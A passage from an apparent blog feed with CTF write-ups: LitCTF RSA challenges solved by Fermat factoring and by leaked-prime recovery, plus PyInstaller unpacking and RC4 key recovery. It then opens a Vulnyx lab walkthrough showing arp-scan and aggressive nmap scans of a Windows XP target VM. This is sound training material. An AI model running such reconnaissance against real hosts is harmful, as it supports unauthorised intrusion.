        y <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>y2<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        <span class="token keyword">if</span> y <span class="token operator">*</span> y <span class="token operator">==</span> y2<span class="token punctuation">:</span>
            <span class="token keyword">break</span>
        x <span class="token operator">+=</span> <span class="token number">1</span>

    result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>x <span class="token operator">+</span> y<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>x <span class="token operator">-</span> y<span class="token punctuation">)</span><span class="token punctuation">]</span>
    <span class="token keyword">return</span> result
n<span class="token operator">=</span><span class="token number">169522900072954416356051647146585827691225327527086797334523482640452305793443986277933900273961829438217255938808371865341750200444086653241610669340348513884285892043530862971785487294831341653909852543469963032532560079879299447677636753647721541724969084825510405349373420839032990681851700075554428485967</span>
c<span class="token operator">=</span><span class="token number">105943762023156641770119141175498496686312095002592803768522760959533958364969985856505466722378959991757667341747887520146437729810252085791886309974903778546814812093444837674447485802109225767800488527376777153844313243366001288246744190001997192598159277512188417272938455513900277907186067996704043274199</span>
p<span class="token punctuation">,</span>q<span class="token operator">=</span>fermat<span class="token punctuation">(</span>n<span class="token punctuation">)</span>
e<span class="token operator">=</span><span class="token number">65537</span>
d<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

x<span class="token operator">=</span><span class="token number">1024</span><span class="token operator">*</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
m<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span>
m<span class="token operator">=</span>m<span class="token operator">^</span>x
<span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">#LitCTF&#123;It_i5_little_f3rm4t_the0ry_extenmk&#125;</span></code></pre>
<h3 id="你是capper，还是copper？"><a href="#你是capper，还是copper？" class="headerlink" title="你是capper，还是copper？"></a>你是capper，还是copper？</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> secret <span class="token keyword">import</span> flag
m<span class="token operator">=</span>bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
N<span class="token operator">=</span>getPrime<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span>
p<span class="token operator">=</span>getPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>
q<span class="token operator">=</span>getPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>
n<span class="token operator">=</span>p<span class="token operator">*</span>q
e<span class="token operator">=</span>getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
c<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span>
Q<span class="token operator">=</span>q<span class="token operator">>></span><span class="token number">100</span>
P<span class="token operator">=</span>p<span class="token operator">&lt;&lt;</span><span class="token number">100</span>
a<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>Q<span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span>N<span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"e="</span><span class="token punctuation">,</span>e<span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"c="</span><span class="token punctuation">,</span>c<span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"a="</span><span class="token punctuation">,</span>a<span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"N="</span><span class="token punctuation">,</span>N<span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"P="</span><span class="token punctuation">,</span>P<span class="token punctuation">)</span>

<span class="token triple-quoted-string string">'''
e = 13072237795424057999129127027979234989717137387957646486113645675299547455876355434346547808746552482965795288244687521108647998478307740108159933821771239011129296482617888480397978257432977308896431711182794340987048211178166823842422554472231405752077101111017727678497340027900077855145324567076470130835
c = 68627543734818005182182738951459640368220444851344171131951942770319683236026987275564911027739185775745844128612642216644533871400591052349794872565933125142881743934565729384895786720059720829738537411808512740621199697348750764033684771791461466523568130279863016302934164238161768481421610386382948741646
a = 29886515512126216731872822863342168524178804819277798137694648187535122007361698348012826864316113462619631404784701713598250504350847404704511275173569527993044728758373465323132649093666827652191127263514969054034178232381536186558882792792658400658805864317969510789325209629970510611697264690242354910697279101097076160734551272655637072457755427702327968248887832201456315670206545608108548532387404598868338062368026986272531243881152161156845992888930282181928184864800163331550035605892120822893818762473564190742360913032722805345122954472060199209651480909308623204782049913146103631197775952155897296727758
N = 30862422297928709181239751692704342665112621784469743119416634932990957784925336225419558020781912482604031494963767628422741140218194125167564890910023973751859762772564509417727807585344663605720306848651674777455957321846686766028032897935430317914513843941842612162856081647345544367930417644089939010942052714956124340450925431546635109101203596120066417771724536199794090338054127436783996371330443765655164007345152020956671886134143225546713511939703191665568669852593956318012200617631356629493372579211049274189611392878353716894836226969536226832390617104216783180964503619839420953622098097344241832069521
P=8770594378518257184819328657308152928029757169205998713929325053727701443407644651726148745366587806353078115048763121275581729457548618046203512855832519694356213899919351220281540608
'''</span></code></pre>
<p>知道q的高位和p的低位，e很大,考虑维也纳攻击,用了几个脚本都没跑出来d<br>看了一下别人的wp，发现P右移100位直接能恢复p</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> gmpy2
P<span class="token operator">=</span><span class="token number">8770594378518257184819328657308152928029757169205998713929325053727701443407644651726148745366587806353078115048763121275581729457548618046203512855832519694356213899919351220281540608</span>
p<span class="token operator">=</span>P<span class="token operator">>></span><span class="token number">100</span>

e <span class="token operator">=</span> <span class="token number">13072237795424057999129127027979234989717137387957646486113645675299547455876355434346547808746552482965795288244687521108647998478307740108159933821771239011129296482617888480397978257432977308896431711182794340987048211178166823842422554472231405752077101111017727678497340027900077855145324567076470130835</span>
c <span class="token operator">=</span> <span class="token number">68627543734818005182182738951459640368220444851344171131951942770319683236026987275564911027739185775745844128612642216644533871400591052349794872565933125142881743934565729384895786720059720829738537411808512740621199697348750764033684771791461466523568130279863016302934164238161768481421610386382948741646</span>
N <span class="token operator">=</span> <span class="token number">30862422297928709181239751692704342665112621784469743119416634932990957784925336225419558020781912482604031494963767628422741140218194125167564890910023973751859762772564509417727807585344663605720306848651674777455957321846686766028032897935430317914513843941842612162856081647345544367930417644089939010942052714956124340450925431546635109101203596120066417771724536199794090338054127436783996371330443765655164007345152020956671886134143225546713511939703191665568669852593956318012200617631356629493372579211049274189611392878353716894836226969536226832390617104216783180964503619839420953622098097344241832069521</span>
q<span class="token operator">=</span>N<span class="token operator">//</span>p 
d<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># LitCTF&#123;wiener_@nd_c0pp3r&#125;</span></code></pre>
<h3 id="暗号-paillier"><a href="#暗号-paillier" class="headerlink" title="暗号-paillier"></a>暗号-paillier</h3><p>额，Paillier加密不会</p>
<h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="ezpython！！！！！"><a href="#ezpython！！！！！" class="headerlink" title="ezpython！！！！！"></a>ezpython！！！！！</h3><p>当时这个解包没找到它的Litctfbase64库，所以找不到它的加密逻辑，这里重做下<br>先是解包拿到密文</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>
<span class="token comment"># visit https://tool.lu/pyc/ for more information</span>
<span class="token comment"># Version: Python 3.11</span>

<span class="token keyword">import</span> Litctfbase64
flag <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'flag:'</span><span class="token punctuation">)</span>
flag <span class="token operator">=</span> Litctfbase64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
<span class="token keyword">if</span> flag <span class="token operator">==</span> <span class="token string">'X=3o4hx=0EZwf=mMv13gX=3o4hx=qje2ZjtgZQmEKXZog4=='</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'win'</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token boolean">None</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'no'</span><span class="token punctuation">)</span></code></pre>
<p>这次用了在线的解包工具<br><a href="https://pyinstxtractor-web.netlify.app/%E8%A7%A3%E5%87%BA%E4%BA%86Litctfbase64.pyc">https://pyinstxtractor-web.netlify.app/解出了Litctfbase64.pyc</a><br><img src="https://ooo.0x0.ooo/2024/06/08/OJ9wKj.png" alt="OJ9wKj.png" loading="lazy"><img src="https://ooo.0x0.ooo/2024/06/08/OJjqHv.png" alt="OJjqHv.png" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/06/08/OJj5Xq.png" alt="OJj5Xq.png" loading="lazy"><br>可能我的windows环境有点问题吧<br>换成linux果然也搞出来了，下次就用linux吧</p>
<pre class="language-zsh" data-language="zsh"><code class="language-zsh"> ~&#x2F;Desktop&#x2F;ezpy.exe_extracted&#x2F;PYZ-00.pyz_extracted                                                                                                                                                                       root@kali2  16:17:22 
&gt; ls -al
total 2524
drwxr-xr-x 6 root root   4096 Jun  8 16:17 .
drwxr-xr-x 3 root root   4096 Jun  8 16:17 ..
-rw-r--r-- 1 root root   3243 Jun  8 16:17 Litctfbase64.pyc
-rw-r--r-- 1 root root   7503 Jun  8 16:17 _compat_pickle.pyc
-rw-r--r-- 1 root root   8039 Jun  8 16:17 _compression.pyc
-rw-r--r-- 1 root root   7855 Jun  8 16:17 _py_abc.pyc</code></pre>
<h3 id="ezrc4"><a href="#ezrc4" class="headerlink" title="ezrc4"></a>ezrc4</h3><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// esi</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// eax</span>
  <span class="token keyword">char</span> Str<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-168h] BYREF</span>
  __int64 Buf1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+40h] [rbp-148h] BYREF</span>
  <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment">// [rsp+50h] [rbp-138h]</span>
  <span class="token keyword">char</span> v9<span class="token punctuation">;</span> <span class="token comment">// [rsp+54h] [rbp-134h]</span>
  <span class="token keyword">char</span> v10<span class="token punctuation">[</span><span class="token number">296</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+60h] [rbp-128h] BYREF</span>

  <span class="token function">_main</span><span class="token punctuation">(</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> envp<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">IsDebuggerPresent_1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  Buf1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x606EA290DC7CB2D5</span>i64<span class="token punctuation">;</span>
  Buf1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x3190B05971E41306</span>i64<span class="token punctuation">;</span>
  v8 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">685914190</span><span class="token punctuation">;</span>
  v9 <span class="token operator">=</span> <span class="token number">127</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"                                      ___                 ___   \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"                 ___          ___    /  /\\        ___    /  /\\  \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"                /  /\\        /  /\\  /  /:/       /  /\\  /  /:/_ \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"  ___     ___  /  /:/       /  /:/ /  /:/       /  /:/ /  /:/ /\\\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">" /__/\\   /  /\\/__/::\\      /  /:/ /  /:/  ___  /  /:/ /  /:/ /:/\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">" \\  \\:\\ /  /:/\\__\\/\\:\\__  /  /::\\/__/:/  /  /\\/  /::\\/__/:/ /:/ \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"  \\  \\:\\  /:/    \\  \\::/\\__/:/\\:\\  \\:\\ /  /:/__/:/\\:\\  \\:\\/:/  \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"   \\  \\:\\/:/      \\__\\/\\__\\/  \\:\\  \\:\\  /:/\\__\\/  \\:\\  \\::/   \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"    \\  \\::/       /__/:/      \\  \\:\\  \\:\\/:/      \\  \\:\\  \\:\\  \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"     \\__\\/        \\__\\/        \\__\\/\\  \\::/        \\__\\/\\  \\:\\ \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"                                     \\__\\/               \\__\\/   \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>byte_140011328<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>byte_140011358<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>byte_140011380<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>byte_1400113B0<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"input flag:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s21"</span><span class="token punctuation">,</span> Str<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v3 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>Str<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v4 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">rc4_init</span><span class="token punctuation">(</span>v10<span class="token punctuation">,</span> key<span class="token punctuation">,</span> v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">rc4_crypt</span><span class="token punctuation">(</span>v10<span class="token punctuation">,</span> Str<span class="token punctuation">,</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">memcmp</span><span class="token punctuation">(</span>Buf1<span class="token punctuation">,</span> Str<span class="token punctuation">,</span> <span class="token number">0x15u</span>i64<span class="token punctuation">)</span> <span class="token punctuation">)</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"win!!!!!!!!!!!!!!!!!!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">else</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"nonono\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>
<p>试了一下这个key是假的</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int8 <span class="token operator">*</span>__fastcall <span class="token function">rc4_init</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">,</span> <span class="token keyword">int</span> a3<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  __int64 i<span class="token punctuation">;</span> <span class="token comment">// rcx</span>
  __int64 v5<span class="token punctuation">;</span> <span class="token comment">// rdx</span>
  <span class="token keyword">signed</span> <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// ecx</span>
  <span class="token keyword">unsigned</span> __int8 v7<span class="token punctuation">;</span> <span class="token comment">// r8</span>
  <span class="token keyword">char</span> v8<span class="token punctuation">;</span> <span class="token comment">// al</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment">// ecx</span>
  <span class="token keyword">unsigned</span> __int8 <span class="token operator">*</span>result<span class="token punctuation">;</span> <span class="token comment">// rax</span>
  <span class="token keyword">char</span> v11<span class="token punctuation">[</span><span class="token number">264</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-108h] BYREF</span>

  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span>i64<span class="token punctuation">;</span> i <span class="token operator">!=</span> <span class="token number">256</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>
    v11<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a2 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>i <span class="token operator">%</span> a3<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  v5 <span class="token operator">=</span> <span class="token number">0</span>i64<span class="token punctuation">;</span>
  v6 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">do</span>
  <span class="token punctuation">&#123;</span>
    v7 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> v5<span class="token punctuation">)</span><span class="token punctuation">;</span>
    v8 <span class="token operator">=</span> v11<span class="token punctuation">[</span>v5<span class="token punctuation">]</span> <span class="token operator">+</span> v6 <span class="token operator">+</span> v7<span class="token punctuation">;</span>
    v9 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>v11<span class="token punctuation">[</span>v5<span class="token punctuation">]</span> <span class="token operator">+</span> v6 <span class="token operator">+</span> v7<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">24</span><span class="token punctuation">;</span>
    v6 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token punctuation">(</span>v9 <span class="token operator">+</span> v8<span class="token punctuation">)</span> <span class="token operator">-</span> v9<span class="token punctuation">;</span>
    result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> v6<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> v5<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">*</span>result<span class="token punctuation">;</span>
    <span class="token operator">*</span>result <span class="token operator">=</span> v7<span class="token punctuation">;</span>
    <span class="token operator">++</span>v5<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span> v5 <span class="token operator">!=</span> <span class="token number">256</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>
<p><img src="https://ooo.0x0.ooo/2024/06/08/OJjTxc.png" alt="OJjTxc.png" loading="lazy"><br>看key的引用，找到一个加密逻辑</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> <span class="token operator">*</span><span class="token function">X_X</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>result<span class="token punctuation">;</span> <span class="token comment">// rax</span>
  _BYTE <span class="token operator">*</span>v1<span class="token punctuation">;</span> <span class="token comment">// rdx</span>

  result <span class="token operator">=</span> key<span class="token punctuation">;</span>
  v1 <span class="token operator">=</span> <span class="token operator">&amp;</span>key1<span class="token punctuation">;</span>
  <span class="token keyword">do</span>
    <span class="token operator">*</span>result<span class="token operator">++</span> <span class="token operator">^=</span> <span class="token operator">*</span>v1<span class="token operator">++</span><span class="token punctuation">;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span> result <span class="token operator">!=</span> <span class="token operator">&amp;</span>key<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>
<p>看一下key1<br><img src="https://ooo.0x0.ooo/2024/06/08/OJjUJr.png" alt="OJjUJr.png" loading="lazy"><br>[10,12,26,8,17,31,30]<br>异或求一下key</p>
<pre class="language-python" data-language="python"><code class="language-python">a<span class="token operator">=</span><span class="token string">'fenkey?'</span>
b<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">26</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">]</span>
key<span class="token operator">=</span><span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    key<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>
<span class="token comment">#litctf!</span></code></pre>
<p>有key，密文就能解密了</p>
<pre class="language-none"><code class="language-none">Buf1[0] &#x3D; 0x606EA290DC7CB2D5i64;
Buf1[1] &#x3D; 0x3190B05971E41306i64;
v8 &#x3D; 0xD71DC7B2;
v9 &#x3D; 0x7F;</code></pre>
<p>密文是D5B27CDC90A26E600613E47159B09031B2C71DD77F<br><img src="https://ooo.0x0.ooo/2024/06/08/OJjkBG.png" alt="OJjkBG.png" loading="lazy"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
        <tag>Re</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnyx-Experience</title>
    <url>/posts/3a160b8e/</url>
    <content><![CDATA[<p><strong>难度:easy</strong></p>
<p><strong>kali:192.168.56.104</strong></p>
<p><strong>靶机:192.168.56.198</strong></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> arp-scan <span class="token parameter variable">-l</span> 
Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: <span class="token number">192.168</span>.56.104
Starting arp-scan <span class="token number">1.10</span>.0 with <span class="token number">256</span> hosts <span class="token punctuation">(</span>https://github.com/royhills/arp-scan<span class="token punctuation">)</span>
<span class="token number">192.168</span>.56.1    0a:00:27:00:00:05       <span class="token punctuation">(</span>Unknown: locally administered<span class="token punctuation">)</span>
<span class="token number">192.168</span>.56.100  08:00:27:77:db:85       PCS Systemtechnik GmbH
<span class="token number">192.168</span>.56.198  08:00:27:f8:3c:9d       PCS Systemtechnik GmbH</code></pre>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> nmap <span class="token variable">$IP</span> <span class="token parameter variable">-sS</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-T4</span> -p- <span class="token parameter variable">-A</span>
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-07-16 <span class="token number">22</span>:54 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.56.198
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00032s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65532</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT    STATE SERVICE      VERSION
<span class="token number">135</span>/tcp <span class="token function">open</span>  msrpc        Microsoft Windows RPC
<span class="token number">139</span>/tcp <span class="token function">open</span>  netbios-ssn  Microsoft Windows netbios-ssn
<span class="token number">445</span>/tcp <span class="token function">open</span>  microsoft-ds Windows XP microsoft-ds
MAC Address: 08:00:27:F8:3C:9D <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
Device type: general purpose
Running: Microsoft Windows XP<span class="token operator">|</span><span class="token number">2003</span>
OS CPE: cpe:/o:microsoft:windows_xp cpe:/o:microsoft:windows_server_2003
OS details: Microsoft Windows XP SP2 or SP3, or Windows Server <span class="token number">2003</span>
Network Distance: <span class="token number">1</span> hop
Service Info: OSs: Windows, Windows XP<span class="token punctuation">;</span> CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
<span class="token operator">|</span>_clock-skew: mean: 19h30m10s, deviation: 4h56m59s, median: 16h00m10s
<span class="token operator">|</span> smb-os-discovery: 
<span class="token operator">|</span>   OS: Windows XP <span class="token punctuation">(</span>Windows <span class="token number">2000</span> LAN Manager<span class="token punctuation">)</span>
<span class="token operator">|</span>   OS CPE: cpe:/o:microsoft:windows_xp::-
<span class="token operator">|</span>   Computer name: experience
<span class="token operator">|</span>   NetBIOS computer name: EXPERIENCE<span class="token punctuation">\</span>x00
<span class="token operator">|</span>   Workgroup: WORKGROUP<span class="token punctuation">\</span>x00
<span class="token operator">|</span>_  System time: <span class="token number">2024</span>-07-16T23:55:13-07:00
<span class="token operator">|</span> smb-security-mode: 
<span class="token operator">|</span>   account_used: guest
<span class="token operator">|</span>   authentication_level: user
